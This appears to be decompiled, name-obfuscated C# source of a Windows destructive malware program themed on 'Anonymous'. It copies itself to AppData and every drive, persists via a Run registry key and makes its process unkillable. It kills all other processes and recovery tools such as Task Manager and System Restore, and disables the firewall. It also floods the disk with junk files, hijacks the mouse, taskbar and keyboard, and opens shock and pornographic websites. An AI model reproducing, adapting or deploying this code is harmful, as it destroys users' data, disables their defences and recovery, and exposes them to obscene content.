using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace FqghP3gHxnBwblp;

public class TmgplMKIM4Yk3yp69JNNohedQvB3 : Form
{
	[Flags]
	private enum ProcessAccessRights
	{
		ProcessAllAccess = 0x1F0FFF
	}

	private const string iqqg6X4rZ46q4jqbTxsQ82bjaA2UoIj4Kb = "4i1kJmIsZvqNtmrISJuoKhtcl6M";

	private string[] wlpoCHxsdKteWwqq5JJItuSO91E6aM0IMqh;

	private Point Khow8r1tsrP2OIqFiW0ANWzj7sfjVPHlN;

	private IContainer YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi;

	private Timer c9nNaVZwWOzEz;

	private Timer q5mVGEsxavWsrkqpUxOdMiDM4K2TdZMfRqfIs8TbrK2vG;

	private Timer E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR;

	private Timer SXlcH8qzESF4bJpTjWmXrc1M1Ce;

	private Timer timer_0;

	private Timer kPktJCoB7fpGW8p;

	private Timer xLjBflRCmWLuOlpDVxazqz5fYU1S1gep;

	private Timer LHjJL5lDBD8iGxpS8JrrK1MKWlC4MjV3ZWc;

	private Timer ZDiShPPEPjv6yKp7kWIj5ttfV;

	private Timer dyh0NzjF40SUrWpnx8ZbpV9JUcOs;

	private Timer ruh8jjNGjGfIj9pCJk;

	[DllImport("user32.dll")]
	private static extern int SwapMouseButton(int bSwap);

	private static void SwapMouse(int value)
	{
		try
		{
			SwapMouseButton(value);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	private static void TaskBar(int value)
	{
		try
		{
			int hwnd = FindWindow("Shell_TrayWnd", "");
			ShowWindow(hwnd, value);
		}
		catch
		{
		}
	}

	private static void OnExecution()
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.Id != currentProcess.Id)
			{
				try
				{
					process.Kill();
				}
				catch
				{
				}
			}
		}
	}

	private static void PlaySong()
	{
		while (true)
		{
			Console.Beep(890, 400);
			Console.Beep(990, 400);
			Console.Beep(790, 400);
			Console.Beep(390, 400);
			Console.Beep(590, 1600);
		}
	}

	public TmgplMKIM4Yk3yp69JNNohedQvB3()
	{
		RyrZ4u6pvGmNjUqGt8V6u7OkcJQwSCWOIGOGt();
		Install(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
	}

	private static void Install(string path)
	{
		try
		{
			if (!(Application.get_StartupPath() == path))
			{
				File.Copy(Application.get_ExecutablePath(), path + "\\4i1kJmIsZvqNtmrISJuoKhtcl6M.exe");
				Process.Start(path + "\\4i1kJmIsZvqNtmrISJuoKhtcl6M.exe");
				Process.GetCurrentProcess().Kill();
			}
		}
		catch
		{
		}
	}

	private void Zh8axnQg71RpCBjYutwgZUNEuRPM3kmkXR5EWvmYCOp0V(object sender, EventArgs e)
	{
		for (int i = 0; i < 3; i++)
		{
			((Control)this).Hide();
		}
		c9nNaVZwWOzEz.Stop();
	}

	private void lfOc1QlMKZuvpR8TgmO4A(object sender, EventArgs e)
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			wlpoCHxsdKteWwqq5JJItuSO91E6aM0IMqh = "taskmgr.cmd.msconfig.wmplayer.calc.notepad.skype.aim.steam.origin.utorrent.bittorrent.powershell.winrar.winword.excel.powerpnt.outlook.vlc.javaw.mirc.ccleaner.poweriso.mspaint.photoshop.teamviewer.defraggler.moviemaker.wireshark.acrord.rstrui.filezilla.vmware.firefox.chrome.opera.manycam.itunes".Split(new char[1] { '.' });
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					try
					{
						File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo.RootDirectory, Path.GetFileName(Application.get_ExecutablePath())));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			Protect(AceQualifier.AccessDenied);
			MessageBox.Show("Anonymous we are legion we do not forgive we do not forge  expect us :)\r\n", "ANONYMOUS");
			new Thread(Bomb).Start();
			if (wlpoCHxsdKteWwqq5JJItuSO91E6aM0IMqh[0] != "")
			{
				q5mVGEsxavWsrkqpUxOdMiDM4K2TdZMfRqfIs8TbrK2vG.set_Enabled(true);
			}
			new Thread(SetReg).Start();
			ruh8jjNGjGfIj9pCJk.set_Enabled(true);
			ZDiShPPEPjv6yKp7kWIj5ttfV.set_Enabled(true);
			xLjBflRCmWLuOlpDVxazqz5fYU1S1gep.set_Enabled(true);
			dyh0NzjF40SUrWpnx8ZbpV9JUcOs.set_Enabled(true);
			SwapMouse(1);
			TaskBar(0);
			new Thread(DisableFirewall).Start();
			new Thread(PlaySong).Start();
			Khow8r1tsrP2OIqFiW0ANWzj7sfjVPHlN = Cursor.get_Position();
			new Thread(y0j7hugXS8G).Start();
			new Thread(WriteFile).Start();
		}
		catch
		{
		}
	}

	private static void Bomb()
	{
		int num = 0;
		while (true)
		{
			try
			{
				File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + num + ".tmp");
			}
			catch
			{
			}
			num++;
		}
	}

	private static void WriteFile()
	{
		try
		{
			using FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.tmp", FileMode.Append);
			Random random = new Random();
			byte[] array = new byte[1];
			while (true)
			{
				random.NextBytes(array);
				fileStream.WriteByte(array[0]);
			}
		}
		catch
		{
		}
	}

	private void y0j7hugXS8G()
	{
		while (true)
		{
			Thread.Sleep(130);
			Cursor.set_Position(Khow8r1tsrP2OIqFiW0ANWzj7sfjVPHlN);
		}
	}

	private static void Calculus()
	{
		int num = 0;
		while (true)
		{
			if (num == 200)
			{
				num = 0;
			}
			num += 2;
		}
	}

	private void MWjfNeKY6P3PE2JkFjJSWuZle(object sender, EventArgs e)
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] array = wlpoCHxsdKteWwqq5JJItuSO91E6aM0IMqh;
			foreach (string value in array)
			{
				if (process.ProcessName.ToLower().Contains(value) && process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}

	private static void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void DisableFirewall()
	{
		while (true)
		{
			Thread.Sleep(5000);
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "netsh.exe";
				process.StartInfo.Arguments = "firewall set opmode disable";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			catch
			{
			}
		}
	}

	private static void Shutdown(string arguements)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "shutdown.exe";
			process.StartInfo.Arguments = arguements;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private void xzUOouZDB4tF5A(object sender, EventArgs e)
	{
		Random random = new Random();
		E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR.set_Interval(random.Next(1000, 10001));
		new Thread(BeepThread).Start();
	}

	private static void BeepThread()
	{
		Console.Beep();
	}

	private void rjRlrrVHyOWUAoqoVJytG5PB2AKhRmSbO99t(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			SXlcH8qzESF4bJpTjWmXrc1M1Ce.set_Interval(random.Next(4000, 120001));
			switch (random.Next(0, 4))
			{
			case 0:
				Process.Start("mspaint.exe");
				break;
			case 1:
				Process.Start("write.exe");
				break;
			case 2:
				Process.Start("explorer.exe");
				break;
			case 3:
				Process.Start("notepad.exe");
				break;
			}
		}
		catch
		{
		}
	}

	private void yZO118jNJfMWXpqCWJUQjlh4WKJgGDllVpC(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			timer_0.set_Interval(random.Next(1000, 120000));
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void lsJ583aVDKIoX2qAzk4OXYN1McwPM3Sq6py7fNfM4J3LSA(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			int num = random.Next(0, 8);
			kPktJCoB7fpGW8p.set_Interval(random.Next(5000, 120001));
			switch (num)
			{
			case 0:
				Process.Start("http://www.asspong.com");
				break;
			case 1:
				Process.Start("http://meatspin.com");
				break;
			case 2:
				Process.Start("http://www.youporngay.com");
				break;
			case 3:
				Process.Start("http://www.octopusgirl.com");
				break;
			case 4:
				Process.Start("http://www.loltrain.com");
				break;
			case 5:
				Process.Start("http://www.youporn.com");
				break;
			case 6:
				Process.Start("http://trololololololololololo.com");
				break;
			case 7:
				Process.Start("http://www.prolapsed.net");
				break;
			}
		}
		catch
		{
		}
	}

	private void H4FTeu313SUecfq3Nx(object sender, EventArgs e)
	{
		Point position = default(Point);
		Random random = new Random();
		int num = random.Next(2);
		int num2 = random.Next(2);
		xLjBflRCmWLuOlpDVxazqz5fYU1S1gep.set_Interval(random.Next(1000, 60001));
		if (num == 1)
		{
			position.X = Control.get_MousePosition().X + random.Next(1, 501);
		}
		else
		{
			position.X = Control.get_MousePosition().X - random.Next(1, 501);
		}
		if (num2 == 1)
		{
			position.Y = Control.get_MousePosition().Y + random.Next(1, 501);
		}
		else
		{
			position.Y = Control.get_MousePosition().Y - random.Next(1, 501);
		}
		Cursor.set_Position(position);
	}

	private static void StringGen()
	{
		try
		{
			Random random = new Random((int)DateTime.Now.Ticks);
			string text = string.Empty;
			for (int i = 0; i < 31; i++)
			{
				text += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".Length)];
			}
			SendKeys.Send(text);
		}
		catch
		{
		}
	}

	private void alynTCkdFrX7PtqK2J(object sender, EventArgs e)
	{
		Random random = new Random();
		LHjJL5lDBD8iGxpS8JrrK1MKWlC4MjV3ZWc.set_Interval(random.Next(5000, 120001));
		StringGen();
	}

	private void ZDiShPPEPjv6yKp7kWIj5ttfV_Tick(object sender, EventArgs e)
	{
		Random random = new Random();
		ZDiShPPEPjv6yKp7kWIj5ttfV.set_Interval(random.Next(5000, 60001));
		new Thread(OpenDisk).Start();
	}

	[DllImport("winmm.dll")]
	private static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);

	private static void OpenDisk()
	{
		try
		{
			mciSendStringA("set CDAudio door open", "", 127L, 0L);
		}
		catch
		{
		}
	}

	private void XOts0wblzWTzO6qIFkQCaj2mhZsJPoagCFQWla3IZb53HKVcv(object sender, EventArgs e)
	{
		Random random = new Random();
		dyh0NzjF40SUrWpnx8ZbpV9JUcOs.set_Interval(random.Next(1000, 120001));
		ShowMsg();
	}

	private static void SetReg()
	{
		while (true)
		{
			Thread.Sleep(1000);
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "4i1kJmIsZvqNtmrISJuoKhtcl6M", Application.get_ExecutablePath());
			}
			catch
			{
			}
		}
	}

	private static void DisConnecter()
	{
		while (true)
		{
			Thread.Sleep(5000);
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "ipconfig.exe";
				process.StartInfo.Arguments = "/release";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			catch
			{
			}
		}
	}

	private static void tmrClipBoard_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(".");
		}
		catch
		{
		}
	}

	private static void ShowMsg()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		Form val = new Form();
		val.set_Size(new Size(1, 1));
		val.set_StartPosition((FormStartPosition)0);
		Rectangle virtualScreen = SystemInformation.get_VirtualScreen();
		val.set_Location(new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10));
		((Control)val).Show();
		((Control)val).Focus();
		((Control)val).BringToFront();
		val.set_TopMost(true);
		MessageBox.Show((IWin32Window)(object)val, string.Empty, string.Empty, (MessageBoxButtons)0);
		((Component)(object)val).Dispose();
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void Protect(AceQualifier ace)
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescript = GetProcessSecurityDescript(currentProcess);
			processSecurityDescript.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, ace, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			byte[] array = new byte[processSecurityDescript.BinaryLength];
			processSecurityDescript.GetBinaryForm(array, 0);
			SetKernelObjectSecurity(currentProcess, 4, array);
		}
		catch
		{
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	private static RawSecurityDescriptor GetProcessSecurityDescript(IntPtr prHandle)
	{
		try
		{
			byte[] pSecurityDescriptor = new byte[0];
			GetKernelObjectSecurity(prHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
			if ((long)lpnLengthNeeded > 32767L)
			{
				return null;
			}
			return (!GetKernelObjectSecurity(prHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded)) ? null : new RawSecurityDescriptor(pSecurityDescriptor, 0);
		}
		catch
		{
			return null;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	protected override void Dispose(bool disposing)
	{
		if (disposing && YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi != null)
		{
			YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void RyrZ4u6pvGmNjUqGt8V6u7OkcJQwSCWOIGOGt()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi = new Container();
		c9nNaVZwWOzEz = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		q5mVGEsxavWsrkqpUxOdMiDM4K2TdZMfRqfIs8TbrK2vG = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		SXlcH8qzESF4bJpTjWmXrc1M1Ce = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		timer_0 = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		kPktJCoB7fpGW8p = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		xLjBflRCmWLuOlpDVxazqz5fYU1S1gep = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		LHjJL5lDBD8iGxpS8JrrK1MKWlC4MjV3ZWc = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		ZDiShPPEPjv6yKp7kWIj5ttfV = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		dyh0NzjF40SUrWpnx8ZbpV9JUcOs = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		ruh8jjNGjGfIj9pCJk = new Timer(YdoFEbvuH8cQGVqVv8ht7ogN6SQvGSoYOVgQTvtP5bAf90xBi);
		((Control)this).SuspendLayout();
		c9nNaVZwWOzEz.set_Enabled(true);
		c9nNaVZwWOzEz.add_Tick((EventHandler)Zh8axnQg71RpCBjYutwgZUNEuRPM3kmkXR5EWvmYCOp0V);
		q5mVGEsxavWsrkqpUxOdMiDM4K2TdZMfRqfIs8TbrK2vG.set_Interval(500);
		q5mVGEsxavWsrkqpUxOdMiDM4K2TdZMfRqfIs8TbrK2vG.add_Tick((EventHandler)MWjfNeKY6P3PE2JkFjJSWuZle);
		E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR.set_Interval(1000);
		E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR.add_Tick((EventHandler)xzUOouZDB4tF5A);
		SXlcH8qzESF4bJpTjWmXrc1M1Ce.add_Tick((EventHandler)rjRlrrVHyOWUAoqoVJytG5PB2AKhRmSbO99t);
		timer_0.add_Tick((EventHandler)yZO118jNJfMWXpqCWJUQjlh4WKJgGDllVpC);
		kPktJCoB7fpGW8p.add_Tick((EventHandler)lsJ583aVDKIoX2qAzk4OXYN1McwPM3Sq6py7fNfM4J3LSA);
		xLjBflRCmWLuOlpDVxazqz5fYU1S1gep.add_Tick((EventHandler)H4FTeu313SUecfq3Nx);
		LHjJL5lDBD8iGxpS8JrrK1MKWlC4MjV3ZWc.add_Tick((EventHandler)alynTCkdFrX7PtqK2J);
		ZDiShPPEPjv6yKp7kWIj5ttfV.add_Tick((EventHandler)ZDiShPPEPjv6yKp7kWIj5ttfV_Tick);
		dyh0NzjF40SUrWpnx8ZbpV9JUcOs.set_Interval(1000);
		dyh0NzjF40SUrWpnx8ZbpV9JUcOs.add_Tick((EventHandler)XOts0wblzWTzO6qIFkQCaj2mhZsJPoagCFQWla3IZb53HKVcv);
		ruh8jjNGjGfIj9pCJk.set_Interval(1000);
		ruh8jjNGjGfIj9pCJk.add_Tick((EventHandler)tmrClipBoard_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(32, 28));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("FrmMain");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((Form)this).add_Load((EventHandler)lfOc1QlMKZuvpR8TgmO4A);
		((Control)this).ResumeLayout(false);
	}
}
